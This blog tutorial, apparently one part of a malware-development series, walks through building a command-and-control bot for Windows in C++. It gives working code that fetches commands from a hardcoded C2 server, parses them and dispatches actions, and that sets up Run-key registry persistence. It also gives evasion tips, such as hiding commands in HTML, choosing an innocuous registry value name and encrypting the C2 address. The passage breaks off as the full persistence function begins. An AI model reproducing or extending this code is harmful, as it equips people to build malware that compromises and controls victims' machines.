# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="c2-connection">C2 connection<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#c2-connection" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Implementing command and control (C2) functionality is a must-have for malware authors as it allows them to maintain control over infected devices and orchestrate malicious activities efficiently.</p>

<p>They can remotely issue commands to compromised systems, enabling tasks such as data exfiltration, executing additional payloads, spreading within networks, or even launching coordinated attacks.</p>

<p>This centralized control mechanism provides flexibility and adaptability to malware campaigns. Moreover, C2 infrastructure facilitates the collection of valuable information about infected devices and their environments.</p>

<p>In this article I’ll be developing a C2 controlled bot, that will try to connect and changes its activity based on the commands it gets.</p>

<h2 id="web-server">Web server<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#web-server" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>First we can start configuring our web server and the payload or commands that the bot will try to get.</p>

<p>We can simply use python’s http server on port 8000, and host a .html file.</p>

<p>html files can be less suspicious when it comes to network detection systems, and also the commands can be easily stored inside .html files.</p>

<p>We can create the following html document:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>HTML FILE<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div&gt;</span>
        <span class="nt">&lt;p&gt;</span>This is a test HTML page.<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;strong&gt;</span>prs<span class="nt">&lt;/strong&gt;</span>
        <span class="nt">&lt;p&gt;</span>This is a paragraph.<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>More content here.<span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>The part we care about is the word between &lt;\strong&gt; tags, this will be retrieved by our bot and based on the word itself it will do different activities or go into different execution paths.</p>

<p>We can implement two functionalities inside our bot:</p>

<ul>
  <li>Persistence: Writing to key <strong>SOFTWARE\Microsoft\CurrentVersion\Run</strong> and this will be triggered if the commands was <mark>prs</mark>.</li>
  <li>Dropping a file: Dropping a file to Temp path and writing some content, and this will be triggered if the commands was <mark>drp</mark>.</li>
</ul>

<p>Start the http server using python.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-0.png" alt="P1"></p>

<h2 id="initiating-connection-to-c2">Initiating connection to C2<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#initiating-connection-to-c2" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>We will be first creating a function that will fetch and parse the HTML page.</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HINTERNET</span> <span class="n">hInternet</span> <span class="o">=</span> <span class="n">InternetOpenW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">InternetOpenW</code> function is part of the WinINet API in Windows and is used to initialize a session for WinINet functions. This function creates a session handle (<code class="language-plaintext highlighter-rouge">HINTERNET</code>) that represents the top-level interface for WinINet operations, such as making HTTP requests, and we will indeed be communicating over HTTP with our C2 server.</p>

<p>Next we will use <code class="language-plaintext highlighter-rouge">InternetOpenUrlW</code> and pass our URL as an argument so we can establish a connection and get a handle to that URL.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HINTERNET</span> <span class="nf">InternetOpenUrlW</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HINTERNET</span> <span class="n">hInternet</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPCWSTR</span>   <span class="n">lpszUrl</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPCWSTR</span>   <span class="n">lpszHeaders</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>     <span class="n">dwHeadersLength</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>     <span class="n">dwFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD_PTR</span> <span class="n">dwContext</span>
<span class="p">);</span>
</code></pre></div></div>
<p><strong>lpszUrl</strong> will be the full URL of our C2, in my case it’ll be: <code class="language-plaintext highlighter-rouge">http[:]//10[.]0.0[.]5:8000/index.html</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HINTERNET</span> <span class="n">hInternetUrl</span> <span class="o">=</span> <span class="n">InternetOpenUrlW</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span> <span class="s">L"http://10.0.0.5:8000/index.html"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">INTERNET_FLAG_HYPERLINK</span> <span class="o">|</span> <span class="n">INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>The flags passed means:</p>
<ul>
  <li><strong>INTERNET_FLAG_HYPERLINK</strong> : Forces a reload if there is no Expires time and no LastModified time returned from the server when determining whether to reload the item from the network.</li>
  <li><strong>INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</strong>: Disables checking of SSL/PCT-based certificates for proper validity dates.</li>
</ul>

<p>After we have initialized a connection successfully, Now we need to allocate some space so we can copy the file to.</p>

<p>We can simply do that using <strong>LocalAlloc()</strong>:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PBYTE</span> <span class="n">pBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
</code></pre></div></div>
<p>I choose 1000 as a size here arbitrarily, but you have to choose the size of data you want the application to read.</p>

<p>After we’ve allocated the space, we need to read the bytes:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">InternetReadFile</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">,</span> <span class="n">pBytes</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesRead</span><span class="p">)</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">hInternetUrl</code> is the handle to the connection we’ve established, the bytes will be read and store in pBytes.</p>

<p>Now we have completed everything we need, but note that the pointer <strong>pBytes</strong> will lose its value once the function returns, in order to preserve the value of it (which is our data) we need to pass a <strong>pointer to a pointer</strong>, and then dereference that pointer and assign the allocated memory block to it.</p>

<p>This way:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// At the start of the function</span>
<span class="n">BOOL</span> <span class="n">FetchData</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">**</span> <span class="n">pPointer</span><span class="p">)</span>

<span class="c1">// At the end of the function</span>
<span class="o">*</span><span class="n">pPointer</span> <span class="o">=</span> <span class="n">wideString</span><span class="p">;</span>
</code></pre></div></div>

<blockquote>
  <p>The type of the passed variable is wchar_t because we will be passing it to another function that accepts wide character strings.</p>
</blockquote>

<p>A code snippet that will be added to the function in order to convert the bytes we read to wide string:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">bufferSize</span> <span class="o">=</span> <span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">pBytes</span><span class="p">,</span> <span class="n">dwBytesRead</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">bufferSize</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Error in MultiByteToWideChar: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
  <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
  <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">wchar_t</span><span class="o">*</span> <span class="n">wideString</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">bufferSize</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">wideString</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation failed"</span><span class="p">);</span>
  <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
  <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
  <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">pBytes</span><span class="p">,</span> <span class="n">dwBytesRead</span><span class="p">,</span> <span class="n">wideString</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Error in MultiByteToWideChar: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
  <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
  <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
  <span class="n">LocalFree</span><span class="p">(</span><span class="n">wideString</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Now the complete code of the function:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">FetchData</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">**</span> <span class="n">pPointer</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">HINTERNET</span> <span class="n">hInternet</span> <span class="o">=</span> <span class="n">InternetOpenW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hInternet</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"InternetOpen failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">HINTERNET</span> <span class="n">hInternetUrl</span> <span class="o">=</span> <span class="n">InternetOpenUrlW</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span> <span class="s">L"http://10.0.0.5:8000/index.html"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">INTERNET_FLAG_HYPERLINK</span> <span class="o">|</span> <span class="n">INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hInternetUrl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"InternetOpenUrl failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">PBYTE</span> <span class="n">pBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>

  <span class="n">DWORD</span> <span class="n">dwBytesRead</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">InternetReadFile</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">,</span> <span class="n">pBytes</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesRead</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Reading file failed error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kt">int</span> <span class="n">bufferSize</span> <span class="o">=</span> <span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">pBytes</span><span class="p">,</span> <span class="n">dwBytesRead</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bufferSize</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error in MultiByteToWideChar: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">wideString</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">bufferSize</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">wideString</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation failed"</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">pBytes</span><span class="p">,</span> <span class="n">dwBytesRead</span><span class="p">,</span> <span class="n">wideString</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error in MultiByteToWideChar: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">wideString</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="o">*</span><span class="n">pPointer</span> <span class="o">=</span> <span class="n">wideString</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Hardcoding the IP of the C2 like this inside the function is not the best thing to do, you can pass the URL to the function as a parameter, that will be more practical, and also to do some encoding or encryption, Try it out and modify the code :).</p>
</blockquote>

<p>Let’s do a quick test to see if the function works properly, don’t forget the running web server.</p>

<p>We can put a breakpoint at the end of the function to check the final buffer:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-1.png" alt="P2"></p>

<p>As we can see we have successfully been able to fetch and save data.</p>

<p>The next step will be parsing the HTML and looking for our commands and choose the functionality based on it.</p>

<h1 id="parsing-c2-commands">Parsing c2 commands<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#parsing-c2-commands" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>We can write a simple function to parse the data and locate exactly the location of our command, As we stated earlier the command will be between &lt;\strong&gt; tags:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">parseHTML</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span> <span class="n">html</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">start_tag</span> <span class="o">=</span> <span class="s">L"&lt;strong&gt;"</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">wcsstr</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="n">start_tag</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
  
    <span class="n">pos</span> <span class="o">+=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">start_tag</span><span class="p">);</span>
    <span class="kt">wchar_t</span> <span class="n">word</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">wcsncpy_s</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="s">L"prs"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

      <span class="n">RegAct</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="s">L"drp"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

      <span class="n">FileAct</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This function will take <code class="language-plaintext highlighter-rouge">html</code> variable which is the date we have fetched, and will do some filtering in order to find the commands:</p>

<ul>
  <li>prs: If it was found the function <strong>RegAct()</strong> will be executed.</li>
  <li>drp: If found the function <strong>FileAct()</strong> will be executed.</li>
</ul>

<p>The function <code class="language-plaintext highlighter-rouge">wcsstr()</code> is a wide-character version of the <code class="language-plaintext highlighter-rouge">strstr()</code> function in C. It is used to find the first occurrence of a wide-character substring within a wide-character string.</p>

<p>We can extend this by adding more than two functions and more commands to do for example:</p>

<ol>
  <li>Process Enumeration</li>
  <li>Injection</li>
  <li>Collect data about the machine</li>
</ol>

<p>And more, I highly encourage you to try to extend the functionality.</p>

<p>Now let’s write <strong>RegAct()</strong> and <strong>FileAct()</strong> functions.</p>

<h2 id="persistence-in-registry">Persistence in registry<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#persistence-in-registry" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>A very common and simple way of persistence that is widely used between malware authors. Adding an entry to <code class="language-plaintext highlighter-rouge">SOFTWARE\Microsoft\CurrentVersion\Run</code>,  Malware ensures that it will be executed every time the system boots up, thus achieving persistence across reboots.</p>

<p>We can start using <code class="language-plaintext highlighter-rouge">RegCreateKeyExA</code> API first</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LSTATUS</span> <span class="nf">RegCreateKeyExA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">HKEY</span>                        <span class="n">hKey</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">LPCSTR</span>                      <span class="n">lpSubKey</span><span class="p">,</span>
                  <span class="n">DWORD</span>                       <span class="n">Reserved</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">LPSTR</span>                       <span class="n">lpClass</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">DWORD</span>                       <span class="n">dwOptions</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">REGSAM</span>                      <span class="n">samDesired</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="k">const</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpSecurityAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>           <span class="n">PHKEY</span>                       <span class="n">phkResult</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPDWORD</span>                     <span class="n">lpdwDisposition</span>
<span class="p">);</span>
</code></pre></div></div>
<p>This function Creates the specified registry key. If the key already exists, the function opens it.</p>

<p>In this case we want to open <code class="language-plaintext highlighter-rouge">SOFTWARE\\Microsoft\\CurrentVersion\\Run</code>, So we can use it as follows:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HKEY</span> <span class="n">hKey</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">subKey</span> <span class="o">=</span> <span class="s">"SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run"</span><span class="p">;</span>
<span class="n">LONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">RegCreateKeyExA</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="n">subKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">REG_OPTION_NON_VOLATILE</span><span class="p">,</span> <span class="n">KEY_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Nexe we use <code class="language-plaintext highlighter-rouge">RegSetValueExA</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LSTATUS</span> <span class="nf">RegSetValueExA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">HKEY</span>       <span class="n">hKey</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPCSTR</span>     <span class="n">lpValueName</span><span class="p">,</span>
                 <span class="n">DWORD</span>      <span class="n">Reserved</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>      <span class="n">dwType</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="k">const</span> <span class="n">BYTE</span> <span class="o">*</span><span class="n">lpData</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>      <span class="n">cbData</span>
<span class="p">);</span>
</code></pre></div></div>

<p>This API sets the data and type of a specified value under a registry key, <code class="language-plaintext highlighter-rouge">hKey</code> parameter is handle to an open registry key.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">valueName</span> <span class="o">=</span> <span class="s">"LockbitSupp~lol"</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">valueData</span> <span class="o">=</span> <span class="s">"&lt;PATH_TO_YOUR_FILE&gt;"</span><span class="p">;</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">RegSetValueExA</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="n">valueName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">valueData</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">valueData</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>

<blockquote>
  <p>The value name apparently should be a more realistic name, so you don’t get any attention, like ServiceUpdate or any other common name.</p>
</blockquote>

<p>Change <strong>valueData</strong> with the full path of your malware.</p>

<p>After we finish we need to close the key using:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
</code></pre></div></div>

<p>Full code of the function:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">RegAct</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">HKEY</span> <span class="n">hKey</span><span class="p">;</span>
